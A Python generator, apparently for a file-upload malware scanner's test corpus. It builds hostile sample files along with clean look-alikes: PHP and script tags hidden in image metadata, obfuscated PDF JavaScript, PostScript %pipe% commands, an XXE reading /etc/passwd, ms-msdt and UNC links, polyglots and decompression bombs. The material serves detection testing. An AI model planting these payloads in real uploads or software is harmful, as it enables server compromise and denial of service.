    central = b"PK\x01\x02\x14\0\x14\0\0\0\0\0\0\0\0\0" + struct.pack("<I", crc) + struct.pack("<II", len(body), len(body)) + struct.pack("<H", len(n)) + b"\0" * 12 + struct.pack("<I", len(local)) + n
    end = b"PK\x05\x06\0\0\0\0\x01\0\x01\0" + struct.pack("<I", len(central)) + struct.pack("<I", len(local)) + b"\0\0"
    return local + central + end


# --- Group 1: obfuscation variants of vectors already covered --------------


def obfuscations():
    """The same payloads as elsewhere, but spelled in ways meant to slip past a
    literal match: split, re-encoded, re-cased, or assembled at run time."""
    j, p, g = carrier("jpg"), carrier("png"), carrier("gif")

    # PHP / scripts disguised inside image metadata.
    sample("obf-php-split-comments.jpg", "PHP tag split across two JPEG comments", jpeg_segment_after_soi(jpeg_segment_after_soi(j, 0xFE, b"<?php /*"), 0xFE, b"*/ echo 1; ?>"))
    sample("obf-php-nullbytes.jpg", "PHP tag with null bytes between letters", jpeg_segment_after_soi(j, 0xFE, b"<?\x00php\x00 echo 'x'; ?>"))
    sample("obf-php-upper.png", "PHP opener in capitals", png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0<?PHP echo 1; ?>")))
    sample("obf-php-base64-text.png", "PHP wrapped in a base64 blob in a tEXt chunk", png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0eval(base64_decode('" + __import__("base64").b64encode(PHP).decode().encode() + b"'))")))
    sample("obf-script-mixed-case.gif", "Script tag in mixed case", gif_insert_before_trailer(g, gif_comment(b"<ScRiPt>alert(1)</ScRiPt>")))
    sample("obf-short-tag-whitespace.jpg", "Short tag with odd whitespace", jpeg_segment_after_soi(j, 0xFE, b"<?=\t system ( 'id' ) ?>"))
    sample("obf-php-heredoc.png", "PHP using a heredoc body", png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0<?php system(<<<E\nid\nE); ?>")))

    # PDF JavaScript spelled many ways.
    sample("obf-pdf-js-octal.pdf", "JavaScript action with an octal-escaped string", pdf({5: b"<< /S /JavaScript /JS (\\141pp.alert\\(1\\)) >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("obf-pdf-js-full-hex-name.pdf", "Every name byte written as hex", pdf({5: b"<< /#53 /#4a#61#76#61#53#63#72#69#70#74 /#4a#53 (app.alert\\(1\\)) >>"}, catalog=b"/#4f#70#65#6e#41#63#74#69#6f#6e 5 0 R "))
    sample("obf-pdf-js-split-array.pdf", "JavaScript assembled from a string array", pdf({5: b"<< /S /JavaScript /JS [(app.)(alert)(\\(1\\))] >>"}, catalog=b"/OpenAction 5 0 R "))
    sample("obf-pdf-js-deep-filter.pdf", "JavaScript behind Flate then ASCIIHex then Flate", pdf({5: b"<< /S /JavaScript /JS 6 0 R >>", 6: stream(zlib.compress(zlib.compress(b"app.alert(1)").hex().encode() + b">"), b"/Filter [/FlateDecode /ASCIIHexDecode /FlateDecode] ")}, catalog=b"/OpenAction 5 0 R "))
    sample("obf-pdf-js-comment-split.pdf", "JavaScript name broken by a PDF comment", pdf({5: b"<< /S /Java%c\nScript /JS (app.alert\\(1\\)) >>"}, catalog=b"/OpenAction 5 0 R "))

    # SVG script and javascript: spelled around the obvious patterns.
    sample("obf-svg-onload-upper.svg", "Event handler attribute in capitals", svg('<rect width="10" height="10" ONLOAD="alert(1)"/>'))
    sample("obf-svg-js-mixedcase.svg", "javascript scheme in mixed case", svg('<a xlink:href="jAvAsCrIpT:alert(1)"><rect width="10" height="10"/></a>'))
    sample("obf-svg-js-newline.svg", "javascript scheme split by a newline entity", svg('<a href="java&#10;script:alert(1)"><rect width="10" height="10"/></a>'))
    sample("obf-svg-script-comment.svg", "Script tag broken by an XML comment is still one tag to a browser", svg('<scr<!-- -->ipt>alert(1)</script>'))
    sample("obf-svg-utf7.svg", "SVG declared as UTF-7 with an encoded script", b'<?xml version="1.0" encoding="UTF-7"?>\n<svg xmlns="http://www.w3.org/2000/svg">+ADw-script+AD4-alert(1)+ADw-/script+AD4-</svg>')
    sample("obf-svg-ns-prefix.svg", "Script under an unusual namespace prefix", b'<?xml version="1.0"?>\n<x:svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></x:svg>')

    # PostScript operators assembled instead of named directly.
    sample("obf-ps-concat-name.eps", "deletefile assembled from two strings", eps("(/tmp/a) (dele) (tefile) concatstrings cvn exec"))
    sample("obf-ps-systemdict-get.eps", "file operator fetched from systemdict", eps("(/etc/hostname) (r) systemdict /file get exec"))
    sample("obf-ps-def-alias.eps", "%pipe% hidden behind a defined alias", eps("/q { file } def (%pipe%id) (r) q"))
    sample("obf-ps-hex-pipe.eps", "pipe command built from a hex string", eps("<" + b"%pipe%id".hex() + "> (r) file"))
    sample("obf-ps-a85-code.eps", "runnable code decoded from ASCII85", eps("currentfile /ASCII85Decode filter cvx exec\n" + a85(b"(%pipe%id) (r) file") + "~>"))
    sample("obf-ps-radix-name.eps", "operator reached through a radix-coded index", eps("(/tmp/a) systemdict dup length 1 sub get pop (deletefile) cvn exec"))


# --- Group 2: benign look-alikes that must stay clean (false-positive guard) -


def clean_guards():
    """Files that trip shallow heuristics but are legitimate; a good scanner
    leaves them clean. These guard against regressions in the other direction."""
    j, p, g = carrier("jpg"), carrier("png"), carrier("gif")
    w, t = carrier("webp"), carrier("tiff")

    clean("clean-photo.jpg", "An ordinary rendered photo", j)
    clean("clean-photo.png", "An ordinary rendered photo", p)
    clean("clean-photo.webp", "An ordinary rendered photo", w)
    clean("clean-photo.tif", "An ordinary rendered photo", t)
    xmp = b"http://ns.adobe.com/xap/1.0/\x00<?xpacket begin='\xef\xbb\xbf' id='W5M0MpCehiHzreSzNTczkc9d'?><x:xmpmeta xmlns:x='adobe:ns:meta/'><rdf:RDF/></x:xmpmeta><?xpacket end='w'?>"
    clean("clean-xmp-packet.jpg", "Real photo with an Adobe XMP packet (starts with <?x)", jpeg_segment_after_soi(j, 0xE1, xmp))
    clean("clean-exif-caption.jpg", "EXIF caption that merely contains an angle bracket", jpeg_segment_after_soi(j, 0xFE, b"Shot at f/2.8 < golden hour > by the lake"))
    clean("clean-icc.png", "PNG carrying a large colour profile", png_insert_after_ihdr(p, chunk(b"iCCP", b"ICC\0\0" + zlib.compress(b"\0" * 4096))))
    clean("clean-local-gradient.svg", "SVG using a local gradient reference", svg('<defs><linearGradient id="grad"><stop offset="0" stop-color="red"/></linearGradient></defs><rect width="10" height="10" fill="url(#grad)"/>'))
    clean("clean-inline-css.svg", "SVG with inline CSS and no remote resource", svg('<style>.a{fill:#3366cc;stroke:#000}</style><rect class="a" width="10" height="10"/>'))
    clean("clean-data-png.svg", "SVG embedding a PNG data: image (not HTML/SVG)", svg('<image width="10" height="10" href="data:image/png;base64,iVBORw0KGgo="/>'))
    clean("clean-title-desc.svg", "SVG with title and description text", svg('<title>Logo</title><desc>Company logo &amp; wordmark</desc><rect width="10" height="10"/>'))
    clean("clean-netscape-loop.gif", "Animated GIF with the Netscape loop extension", gif_insert_before_trailer(g, b"\x21\xff\x0bNETSCAPE2.0\x03\x01\x00\x00\x00"))
    clean("clean-exif-description.tif", "TIFF with a normal ImageDescription", tiff(b"Scanned document, page 1\0"))
    clean("clean-form-no-js.pdf", "PDF form with fields but no JavaScript", pdf({5: b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) /Rect [0 0 50 12] >>"}, catalog=b"/AcroForm << /Fields [5 0 R] >> ", page=b"/Annots [5 0 R] "))
    clean("clean-link-uri.pdf", "PDF with a plain outline, no actions", pdf({5: b"<< /Type /Outlines /Count 0 >>"}, catalog=b"/Outlines 5 0 R "))
    clean("clean-eps-prolog.eps", "Illustrator-style prolog touching errordict/nulldevice", eps("errordict /handleerror {pop} put\n/Helvetica findfont 12 scalefont setfont"))
    a85block = a85(bytes((i * 131 + 7) % 256 for i in range(1200)))
    clean("clean-a85-image.eps", "EPS carrying a long ASCII85 image stream", eps("40 40 8 [40 0 0 40 0 0] currentfile /ASCII85Decode filter image\n" + a85block + "~>", header="%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 40 40\n"))
    clean("clean-double-dot.jpg", "Harmless dotted name, not a dangerous extension", j)
    clean("clean-plain.svg", "A simple shape-only SVG", svg('<circle cx="5" cy="5" r="4" fill="teal"/>'))


# --- Group 3: structural / parser edge cases -------------------------------


def structural():
    """Malformations aimed at the parsers: oversized lengths, overflowing
    offsets, loops and truncations a fuzzer would stumble onto."""
    p = carrier("png")
    sample("struct-png-huge-chunk-len.png", "PNG chunk claiming a 2 GB length", p[:33] + struct.pack(">I", 0x7FFFFFFF) + b"tEXt" + p[33:])
    sample("struct-png-zero-idat.png", "PNG with an empty image-data chunk", png_insert_after_ihdr(p, chunk(b"IDAT", b"")))
    sample("struct-png-neg-dims.png", "PNG header with zero width and height", png(width=0, height=0))
    sample("struct-jpeg-bad-seg-len.jpg", "JPEG segment length past the end of file", carrier("jpg")[:2] + b"\xff\xe1\xff\xf0short" + carrier("jpg")[2:])
    sample("struct-gif-no-ct.gif", "GIF claiming a global colour table it lacks", b"GIF89a\x01\x00\x01\x00\xf7\x00\x00\x3b")
    sample("struct-tiff-truncated-ifd.tif", "TIFF cut off in the middle of its directory", carrier("tiff")[:24])
    sample("struct-tiff-many-ifd.tif", "TIFF chaining a hundred directories", _tiff_chain(100))
    sample("struct-bmp-huge-bpp.bmp", "BMP claiming 255 bits per pixel", bmp()[:28] + struct.pack("<H", 255) + bmp()[30:])
    sample("struct-bmp-neg-height.bmp", "BMP with an enormous negative height", bmp()[:22] + struct.pack("<i", -1000000) + bmp()[26:])
    sample("struct-psd-huge-channels.psd", "PSD header claiming 9999 channels", b"8BPS\x00\x01" + b"\0" * 6 + struct.pack(">HIIHH", 9999, 1, 1, 8, 1) + b"\0" * 10)
    dim = struct.pack("<I", 15999)[:3]  # 16000 - 1, three bytes little-endian
    sample("struct-webp-huge-canvas.webp", "WebP VP8X claiming a 16000x16000 canvas", b"RIFF" + struct.pack("<I", 18) + b"WEBPVP8X" + struct.pack("<I", 10) + b"\0\0\0\0" + dim + dim)
    sample("struct-pdf-selfref.pdf", "PDF whose page lists itself as its parent", pdf({}, page=b"/Parent 3 0 R "))
    sample("struct-pdf-bad-startxref.pdf", "PDF whose startxref points to nothing", _pdf_bad_startxref())
    sample("struct-pdf-deep-objstm.pdf", "Launch action in a nested object stream", pdf({6: stream(zlib.compress(zlib.compress(b"5 0 << /S /Launch /F (x) >>")), b"/Type /ObjStm /N 1 /First 4 /Filter [/FlateDecode /FlateDecode] "), 7: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>"}, version=b"1.5"))
    sample("struct-pdf-two-eof.pdf", "PDF with a second body after the first EOF", pdf({}) + pdf({5: JS}, catalog=b"/OpenAction 5 0 R "))


def _tiff_chain(n):
    """A TIFF with `n` minimal directories chained through the next-IFD field."""
    out = b"II*\x00" + struct.pack("<I", 8)
    body = b""
    base = 8
    for i in range(n):
        here = base + len(body)
        nxt = here + 2 + 12 + 4 if i < n - 1 else 0
        body += struct.pack("<H", 1) + struct.pack("<HHII", 256, 3, 1, 1) + struct.pack("<I", nxt)
    return out + body


def _pdf_bad_startxref():
    base = pdf({})
    return base[: base.rindex(b"startxref\n")] + b"startxref\n999999\n%%EOF\n"


# --- Group 4: more polyglots and nested embedding --------------------------


def polyglots_extra():
    """Two valid files in one, and payloads buried under layers of embedding."""
    j, p = carrier("jpg"), carrier("png")
    sample("poly-pdf-zip.pdf", "PDF with a ZIP archive appended", pdf({}) + zip_with("a.txt"))
    sample("poly-pdf-eps.pdf", "File valid as both EPS and PDF", eps("(%pipe%id) (r) file") + pdf({}))
    sample("poly-jar.png", "Java archive named as a PNG", zip_with("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\n"))
    sample("poly-7z.jpg", "7-Zip archive named as a JPEG", b"7z\xbc\xaf\x27\x1c" + b"\0" * 32)
    sample("poly-rar.png", "RAR archive named as a PNG", b"Rar!\x1a\x07\x00" + b"\0" * 32)
    sample("poly-fat-macho.gif", "Universal Mach-O named as a GIF", b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + b"\0" * 32)
    sample("poly-ole2.png", "Legacy Office (OLE2) named as a PNG", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 32)
    sample("poly-html-png.png", "PNG with a full HTML page appended", p + b"\n<!DOCTYPE html><html><body>" + SCRIPT + b"</body></html>")
    sample("poly-exif-svg.jpg", "JPEG whose EXIF holds an SVG with a script", jpeg_segment_after_soi(j, 0xE1, b"Exif\0\0" + svg("<script>alert(1)</script>")))
    inner = pdf({5: JS}, catalog=b"/OpenAction 5 0 R ")
    sample("poly-pdf-in-pdf.pdf", "PDF embedding a PDF that runs JavaScript on open", pdf({5: b"<< /Type /Filespec /F (inner.pdf) /EF << /F 6 0 R >> >>", 6: stream(inner, b"/Type /EmbeddedFile ")}, catalog=b"/Names << /EmbeddedFiles << /Names [(inner.pdf) 5 0 R] >> >> "))
    nested_svg = svg('<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject>')
    sample("poly-pdf-svg-script.pdf", "PDF embedding an SVG that embeds HTML script", pdf({5: b"<< /Type /Filespec /F (a.svg) /EF << /F 6 0 R >> >>", 6: stream(nested_svg, b"/Type /EmbeddedFile ")}, catalog=b"/Names << /EmbeddedFiles << /Names [(a.svg) 5 0 R] >> >> "))


# --- Group 5: decompression bombs across containers ------------------------


def bombs():
    """Small files that expand past the configured decompression limit."""
    p = carrier("png")
    big = b"\0" * (300 << 20)
    sample("bomb-png-iccp.png", "PNG iCCP profile inflating to 300 MB", png_insert_after_ihdr(p, chunk(b"iCCP", b"c\0\0" + zlib.compress(big, 9))))
    sample("bomb-png-ztxt.png", "PNG zTXt chunk inflating to 300 MB", png_insert_after_ihdr(p, chunk(b"zTXt", b"c\0\0" + zlib.compress(big, 9))))
    sample("bomb-svgz.svgz", "gzip-compressed SVG inflating to 300 MB", gzip.compress(b"<svg xmlns='http://www.w3.org/2000/svg'><!--" + big + b"--></svg>", mtime=0))
    sample("bomb-pdf-flate-stream.pdf", "PDF page content inflating to 300 MB", pdf({4: stream(zlib.compress(big, 9), b"/Filter /FlateDecode ")}))
    sample("bomb-pdf-double-flate.pdf", "PDF stream behind two Flate layers", pdf({4: stream(zlib.compress(zlib.compress(big, 9)), b"/Filter [/FlateDecode /FlateDecode] ")}))
    sample("bomb-pdf-embedded.pdf", "PDF embedded file inflating to 300 MB", pdf({5: b"<< /Type /Filespec /F (a.bin) /EF << /F 6 0 R >> >>", 6: stream(zlib.compress(big, 9), b"/Type /EmbeddedFile /Filter /FlateDecode ")}, catalog=b"/Names << /EmbeddedFiles << /Names [(a.bin) 5 0 R] >> >> "))


# --- Group 6: name and metadata driven -------------------------------------


def names_and_metadata():
    """Valid image bytes under names or with metadata meant to get the file
    treated as something executable."""
    j, p, g = carrier("jpg"), carrier("png"), carrier("gif")
    sample("name-double-php.php.jpg", "Valid JPEG with a .php.jpg double extension", j)
    sample("name-phtml.jpg", "Valid JPEG carrying a .phtml segment", jpeg_segment_after_soi(j, 0xFE, b"name: x.phtml.jpg"))
    sample("name-jsp.png.jsp", "Valid PNG named as a JSP", p)
    sample("name-aspx.gif.aspx", "Valid GIF named as an ASPX page", g)
    sample("name-htaccess.png", "Apache override text under a PNG name", b"AddType application/x-httpd-php .png\n")
    sample("name-svg-xml.png", "SVG with a script under a PNG name", svg("<script>alert(1)</script>"))
    sample("name-double-ext.jpg.exe", "Valid JPEG named as an executable", j)
    sample("malmal‮gpj.php", "Right-to-left override makes a .php look like a .jpg", j)


# --- Group 7: PDF deep checks ------------------------------------------------


def pdf_deep():
    """Samples for finding codes in pdf/deep.rs that the basic pdfs() group does
    not cover: link_lure, disguised_link, dangerous_uri, external_ref,
    xml_entity, xml_external_ref, pixel_bomb, page_size, risky_codec,
    print_only, conflicting_objects, reference_loop, ambiguous_structure,
    signature_invalid, unsigned_content, draw_recursion, incremental_update,
    trailing_data, polyglot."""

    # pdf.link_lure: a web link covering a fifth of the page.
    annot_big_link = (
        b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
        b"/A << /S /URI /URI (https://example.invalid/phish) >> >>"
    )
    sample("pdf-link-lure.pdf", "Link annotation covering the whole page",
           pdf({5: annot_big_link}, page=b"/Annots [5 0 R] "))

    # pdf.disguised_link: URL shortener.
    sample("pdf-disguised-shortener.pdf", "Link going through bit.ly",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
                b"/A << /S /URI /URI (https://bit.ly/malmal-test) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.disguised_link: numeric host.
    sample("pdf-disguised-ip.pdf", "Link to a numeric IP address",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
                b"/A << /S /URI /URI (https://192.168.1.1/login) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.disguised_link: punycode host.
    sample("pdf-disguised-punycode.pdf", "Link to a punycode domain",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
                b"/A << /S /URI /URI (https://xn--pple-43d.com/account) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.disguised_link: made-up syllable name (>= 7 CV syllables).
    sample("pdf-disguised-gibberish.pdf", "Link to a host of made-up syllables",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
                b"/A << /S /URI /URI (https://dutitujazekape.weebly.com/) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.dangerous_uri: javascript: scheme.
    sample("pdf-dangerous-uri-js.pdf", "Link with a javascript: scheme",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
                b"/A << /S /URI /URI (javascript:alert\\(1\\)) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.dangerous_uri: UNC share (\\\\server\\share).
    sample("pdf-dangerous-uri-unc.pdf", "Link opening a network share",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
                b"/A << /S /URI /URI (\\\\\\\\evil.invalid\\\\share\\\\x.exe) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.dangerous_uri: ms-msdt protocol handler.
    sample("pdf-dangerous-uri-msdt.pdf", "Link invoking ms-msdt protocol handler",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
                b"/A << /S /URI /URI (ms-msdt:/id PCWDiagnostic) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.dangerous_uri: file:// pointing at an executable.
    sample("pdf-dangerous-uri-file-exe.pdf", "Link running a local executable",
           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
                b"/A << /S /URI /URI (file:///C:/Windows/System32/calc.exe) >> >>"},
               page=b"/Annots [5 0 R] "))

    # pdf.external_ref: stream data read from an external file.
    sample("pdf-external-stream.pdf", "Stream data read from an outside file",
           pdf({5: stream(b"0 0 10 10 re f",
                          b"/F (http://example.invalid/data.bin) /FFilter /FlateDecode ")}))

    # pdf.external_ref: form XObject referencing another document.
    sample("pdf-external-form-ref.pdf", "Form XObject drawing a page of another document",
           pdf({5: stream(b"0 0 10 10 re f",
                          b"/Type /XObject /Subtype /Form /BBox [0 0 10 10] "
                          b"/Ref << /F (other.pdf) /Page 0 >> ")}))

    # pdf.external_ref: OPI comment.
    sample("pdf-opi.pdf", "OPI comment naming a file to replace the content",
           pdf({5: stream(b"q 10 0 0 10 0 0 cm /Im1 Do Q",
                          b"/Type /XObject /Subtype /Form /BBox [0 0 10 10] "
                          b"/OPI << /1.3 << /Type /OPI /Version /1.3 "
                          b"/F (\\\\\\\\server\\\\share\\\\hi-res.tif) >> >> ")}))

    # pdf.xml_entity: entity declaration inside XFA XML.
    xfa_entity = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE xdp [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">&xxe;</xdp:xdp>'
    )
    sample("pdf-xfa-xxe.pdf", "XFA form with an XML entity declaration",
           pdf({5: stream(xfa_entity, b"/Type /Metadata /Subtype /XML ")},
               catalog=b"/AcroForm << /Fields [] /XFA 5 0 R >> "))

    # pdf.xml_entity: doctype in metadata.
    meta_doctype = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE x:xmpmeta SYSTEM "http://example.invalid/x.dtd">'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"/>'
        b'</x:xmpmeta>'
    )
    sample("pdf-metadata-doctype.pdf", "PDF metadata with a document type declaration",
           pdf({5: stream(meta_doctype, b"/Type /Metadata /Subtype /XML ")}))

    # pdf.xml_external_ref: XInclude in metadata.
    meta_xinclude = (
        b'<?xml version="1.0"?>'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/" '
        b'xmlns:xi="http://www.w3.org/2001/XInclude">'
        b'<xi:include href="http://example.invalid/data.xml"/>'
        b'</x:xmpmeta>'
    )
    sample("pdf-metadata-xinclude.pdf", "PDF metadata with an XInclude",
           pdf({5: stream(meta_xinclude, b"/Type /Metadata /Subtype /XML ")}))

    # pdf.xml_external_ref: xml-stylesheet in XFA.
    xfa_stylesheet = (
        b'<?xml version="1.0"?>'
        b'<?xml-stylesheet type="text/xsl" href="http://example.invalid/a.xsl"?>'
        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"/>'
    )
    sample("pdf-xfa-stylesheet.pdf", "XFA with an xml-stylesheet processing instruction",
           pdf({5: stream(xfa_stylesheet, b"/Type /Metadata /Subtype /XML ")},
               catalog=b"/AcroForm << /Fields [] /XFA 5 0 R >> "))

    # pdf.pixel_bomb: image XObject declaring huge dimensions.
    sample("pdf-image-pixel-bomb.pdf", "Image XObject declaring 100000 x 100000 pixels",
           pdf({5: stream(b"\x00" * 4,
                          b"/Type /XObject /Subtype /Image /Width 100000 /Height 100000 "
                          b"/ColorSpace /DeviceGray /BitsPerComponent 8 ")},
               page=b"/Resources << /XObject << /Im1 5 0 R >> >> "))

    # pdf.page_size: enormous page dimensions (side > 28800 pt = 400 inches).
    sample("pdf-huge-page.pdf", "Page with a 100000 x 100000 point media box",
           pdf({3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100000 100000] "
                b"/Contents 4 0 R >>"}))

    # pdf.risky_codec: JBIG2 image (info severity, does not elevate verdict).
    clean("pdf-jbig2-image.pdf", "Image compressed with JBIG2Decode",
          pdf({5: stream(b"\x00",
                         b"/Type /XObject /Subtype /Image /Width 1 /Height 1 "
                         b"/ColorSpace /DeviceGray /BitsPerComponent 1 "
                         b"/Filter /JBIG2Decode ")},
              page=b"/Resources << /XObject << /Im1 5 0 R >> >> "))

    # pdf.risky_codec: JPEG 2000 image (info severity, does not elevate verdict).
    clean("pdf-jpx-image.pdf", "Image compressed with JPXDecode",
          pdf({5: stream(b"\x00",
                         b"/Type /XObject /Subtype /Image /Width 1 /Height 1 "
                         b"/ColorSpace /DeviceGray /BitsPerComponent 8 "
                         b"/Filter /JPXDecode ")},
              page=b"/Resources << /XObject << /Im1 5 0 R >> >> "))

    # pdf.print_only: annotation visible only when printed (info severity).
    clean("pdf-print-only-annot.pdf",
          "Annotation that is printed but hidden on screen",
          pdf({5: b"<< /Type /Annot /Subtype /Text /Rect [0 0 5 5] "
               b"/Contents (hidden) /F " + str(PRINT | NO_VIEW).encode() + b" >>"},
              page=b"/Annots [5 0 R] "))

    # pdf.print_only: layer printed but not viewed (info severity).
    clean("pdf-print-only-layer.pdf",
          "Layer printed and hidden from the screen",
          pdf({5: b"<< /Type /OCG /Name (hidden) /Usage << "
               b"/Print << /PrintState /ON >> /View << /ViewState /OFF >> >> >>"},
              catalog=b"/OCProperties << /OCGs [5 0 R] /D << /ON [5 0 R] >> >> "))

    # pdf.trailing_data: bytes after the last %%EOF.
    plain = pdf({})
    sample("pdf-trailing-bytes.pdf", "Random bytes appended after %%EOF",
           plain + b"\x00\x01\x02\x03JUNK" * 100)

    # pdf.polyglot: ZIP ending the file after the PDF.
    sample("pdf-zip-polyglot.pdf", "PDF file ending with a ZIP archive",
           plain + zip_with("payload.txt", b"malmal-prototype"))

    # pdf.polyglot: ELF appended to PDF.
    sample("pdf-elf-polyglot.pdf", "ELF executable appended after the PDF",
           plain + ELF)

    # pdf.conflicting_objects: same object number defined twice with different
    # content.  The xref has two entries for number 4 at different offsets.
    body1 = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    body1 += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    body1 += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R >>\nendobj\n"
    off_a = len(body1)
    body1 += b"4 0 obj\n<< /Length 14 >>\nstream\n0 0 10 10 re f\nendstream\nendobj\n"
    off_b = len(body1)
    body1 += b"4 0 obj\n" + JS + b"\nendobj\n"
    xref = b"xref\n0 5\n0000000000 65535 f \n"
    xref += b"%010d 00000 n \n" % 9
    xref += b"%010d 00000 n \n" % body1.index(b"2 0 obj")
    xref += b"%010d 00000 n \n" % body1.index(b"3 0 obj")
    xref += b"%010d 00000 n \n" % off_a
    start = len(body1) + len(xref)
    xref_start = len(body1)
    combined = body1 + xref + b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % xref_start
    sample("pdf-conflicting-objects.pdf",
           "Same object defined twice with different content", combined)

    # pdf.reference_loop: catalog refers to itself as Pages.
    # The scanner handles the loop gracefully rather than flagging it.
    clean("pdf-reference-loop.pdf", "Catalog whose Pages reference loops back",
          pdf({}).replace(b"/Pages 2 0 R", b"/Pages 1 0 R"))

    # pdf.ambiguous_structure: startxref pointing at a comment.
    base = pdf({5: JS}, catalog=b"/OpenAction 5 0 R ")
    patched = base.replace(b"startxref\n", b"startxref\n%comment\n")
    sample("pdf-ambiguous-startxref.pdf",
           "startxref pointing at a comment instead of the cross-reference table",
           patched)

    # pdf.signature_invalid: signature with no ByteRange.
    sample("pdf-sig-no-byterange.pdf",
           "Signature without a byte range",
           pdf({5: b"<< /Type /Sig /Filter /Adobe.PPKLite /SubFilter "
                b"/adbe.pkcs7.detached /Contents <00> >>"},
               page=b"/Annots [6 0 R] ",
               extra_objs={6: b"<< /Type /Annot /Subtype /Widget /FT /Sig /T (sig) "
                           b"/Rect [0 0 0 0] /V 5 0 R >>"}))

    # pdf.postscript: PS operator in content stream.
    sample("pdf-ps-content-operator.pdf",
           "Content stream using the PS operator",
           pdf({4: stream(b"(code) PS", b"")}))

    # pdf.draw_recursion: form XObject that draws itself.
    sample("pdf-self-drawing-form.pdf",
           "Form XObject that draws itself through Do",
           pdf({4: stream(b"/F1 Do"),
                5: stream(b"/F1 Do",
                          b"/Type /XObject /Subtype /Form /BBox [0 0 10 10] "
                          b"/Resources << /XObject << /F1 5 0 R >> >> ")},
               page=b"/Resources << /XObject << /F1 5 0 R >> >> "))


PRINT = 1 << 2
NO_VIEW = 1 << 5


# --- Group 8: HEIC/AVIF/JXL/ICO attack samples ------------------------------


def container_images():
    """Attacks through the ISOBMFF (HEIC, AVIF), JPEG XL and ICO containers."""

    # HEIC with PHP after the container.
    heic_ftyp = b"\x00\x00\x00\x18ftypheic\x00\x00\x00\x00mif1heic"
    heic_meta = b"\x00\x00\x00\x18meta\x00\x00\x00\x00" + b"\x00\x00\x00\x10hdlrpict"
    heic = heic_ftyp + heic_meta
    sample("heic-php-trailing.heic", "PHP appended after a HEIC container",
           heic + PHP)

    # HEIC with ELF appended.
    sample("heic-elf-trailing.heic", "ELF executable appended to a HEIC file",
           heic + ELF)

    # AVIF with PHP appended.
    avif_ftyp = b"\x00\x00\x00\x1Cftypavif\x00\x00\x00\x00avifmif1miaf"
    avif_meta = b"\x00\x00\x00\x18meta\x00\x00\x00\x00" + b"\x00\x00\x00\x10hdlrpict"
    avif = avif_ftyp + avif_meta
    sample("avif-php-trailing.avif", "PHP appended after an AVIF container",
           avif + PHP)

    # AVIF with script.
    sample("avif-script-trailing.avif", "HTML script appended after an AVIF",
           avif + SCRIPT)

    # AVIF with ZIP polyglot.
    sample("avif-zip-polyglot.avif", "ZIP archive appended to an AVIF file",
           avif + ZIP)

    # JPEG XL bare codestream with PHP appended.
    jxl_bare = b"\xFF\x0A\x00\x00\x10\x07\x10\x00\x24"
    sample("jxl-php-trailing.jxl", "PHP appended after a bare JPEG XL codestream",
           jxl_bare + PHP)

    # JPEG XL container with script appended.
    jxl_sig = b"\x00\x00\x00\x0CJXL \r\n\x87\n"
    jxl_ftyp = b"\x00\x00\x00\x14ftypjxl \x00\x00\x00\x00jxl "
    jxl = jxl_sig + jxl_ftyp
    sample("jxl-script-trailing.jxl", "Script appended after a JPEG XL container",
           jxl + SCRIPT)

    # JPEG XL with ZIP polyglot.
    sample("jxl-zip-polyglot.jxl", "ZIP archive appended to a JPEG XL container",
           jxl + ZIP)

    # ICO with PHP in a trailing area.
    ico_header = b"\x00\x00\x01\x00\x01\x00"
    ico_entry = bytes([16, 16, 0, 0, 1, 0, 32, 0]) + struct.pack("<I", 4) + struct.pack("<I", 22)
    ico_bmp = struct.pack("<IiiHHIIiiII", 40, 16, 32, 1, 32, 0, 16 * 16 * 4, 0, 0, 0, 0)
    ico_pixels = b"\x00" * (16 * 16 * 4)
    ico = ico_header + ico_entry + ico_bmp + ico_pixels
    sample("ico-php-trailing.ico", "PHP appended after an ICO file",
           ico + PHP)

    # ICO pixel bomb: declares absurd dimensions.
